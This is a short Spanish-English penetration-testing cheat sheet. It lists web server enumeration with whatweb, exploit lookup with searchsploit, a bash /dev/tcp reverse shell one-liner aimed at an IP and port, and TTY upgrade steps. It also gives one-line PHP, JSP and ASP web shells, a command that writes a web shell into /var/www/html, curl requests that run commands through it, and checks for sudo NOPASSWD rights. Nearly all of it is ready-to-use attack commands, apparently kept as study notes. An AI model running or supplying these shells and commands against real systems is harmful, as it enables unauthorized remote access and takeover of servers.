## Comandos generales

- Extraer versión de web servers, frameworks y aplicaciones.

    whatweb [IP]
    whatweb 192.168.122.1

- Enumeracación a una red entera

    whatweb --no-errors [NETWORK/XX]
    whatweb --no-errors 192.168.122.0/24

- Buscar exploits para un servicio o aplicación en específico

	sudo apt install exploitdb -y
	searchsploit [SERVICE] [N°]
	example: searchsploit openssh 7.2

- Comandos de reverse shell

    bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'
    bash -c 'bash -i >& /dev/tcp/192.168.122.1/1234 0>&1'

- Upgrading TTY

    python -c 'import pty; pty.spawn("/bin/bash")'

    ctrl + z (for background our shell)
    stty raw -echo
    fg

- Input the following commands to get our variables, esto sirve para ejecutar y corregir el tamaño de nuestra terminal en la netcat shell.

    echo $TERM
    stty size
        67 318

- Writing a web shell script

    php:
    <?php system($_REQUEST["cmd"]); ?>

    jsp:
    <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

    asp:
    <% eval request("cmd") %>

- Uploading the web shell script in the webroot directory of the web server

    php:
    echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

- Ejecutar el comando mediante el script webshell

    http://SERVER_IP:PORT/shell.php?cmd=[COMMAND]
    http://SERVER_IP:PORT/shell.php?cmd=id
    
    curl http://SERVER_IP:PORT/shell.php?cmd=[COMMAND]
    curl http://SERVER_IP:PORT/shell.php?cmd=id

- Ver los privilegios que tiene el usuario actual con sudo

    sudo -l

    Si sale este resultado, el NOPASSWD, significa que podemos ejecutar el comando sudo con ese usuario sin necesidad de poner contraseña:
        (user : user) NOPASSWD: /bin/echo

- Ejecutar sudo como un usuario que tenga privilegios

    sudo -u [USER] /bin/echo Hello World!
    sudo -u user1 /bin/echo Hello World!
